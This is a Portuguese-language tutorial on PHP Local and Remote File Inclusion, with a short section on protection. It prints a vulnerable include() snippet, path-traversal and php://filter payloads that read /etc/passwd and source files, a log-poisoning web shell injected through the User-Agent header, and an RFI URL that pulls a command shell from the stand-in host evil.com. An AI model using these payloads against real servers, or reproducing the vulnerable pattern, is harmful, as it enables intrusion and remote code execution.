# LFI e RFI

📂 LFI & RFI — O que são?

Tipo	Nome	Significado	Acesso a arquivos
LFI	Local File Inclusion	Inclusão de arquivo local	No próprio servidor
RFI	Remote File Inclusion	Inclusão de arquivo remoto (URL)	Servidor externo (remoto)


⸻

🔍 LFI — Local File Inclusion

Ocorre quando uma aplicação carrega um arquivo localmente, baseado em entrada do usuário, sem validação adequada.

🧪 Exemplo vulnerável:

<?php
  $page = $_GET['page'];
  include($page);
?>

🎯 Exploração:

http://target.com/index.php?page=/etc/passwd

💥 Retorna conteúdo do /etc/passwd

🛠️ Outros caminhos úteis para LFI:
	•	/proc/self/environ
	•	/var/log/apache2/access.log (log poisoning)
	•	/proc/self/fd/0

⸻

⚠️ LFI com Execução de Código (log poisoning)

Se o LFI incluir arquivos com conteúdo controlado por você, é possível obter RCE (execução remota de código).

Exemplo:
	1.	Faça uma requisição com código PHP injetado no user-agent:

User-Agent: <?php system($_GET['cmd']); ?>


	2.	Acesse:

http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id



⸻

🌐 RFI — Remote File Inclusion

Acontece quando a aplicação inclui arquivos externos via URL, sem sanitização.

🧪 Exemplo vulnerável:

<?php
  $page = $_GET['page'];
  include($page);
?>

🎯 Exploração:

http://target.com/index.php?page=http://evil.com/shell.txt

📄 shell.txt contém:

<?php system($_GET['cmd']); ?>

💥 Acesso via:

http://target.com/index.php?page=http://evil.com/shell.txt&cmd=whoami


⸻

✅ Como se proteger de LFI e RFI

Boas práticas:
	•	Nunca inclua arquivos com base em entrada do usuário
	•	Valide e sanitize rigorosamente os dados
	•	Use whitelists de arquivos permitidos
	•	Desative allow_url_include no PHP:

allow_url_include = Off



⸻

🛠️ Testes com ferramentas:
	•	Burp Suite (manualmente ou com Intruder)
	•	wfuzz, ffuf (fuzzing para caminhos de arquivos)
	•	liffy (exploração automatizada de LFI)
	•	Commix (se virar RCE)

⸻

🔎 Exemplo de payloads LFI

?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=/proc/self/environ
?page=../../../../var/log/apache2/access.log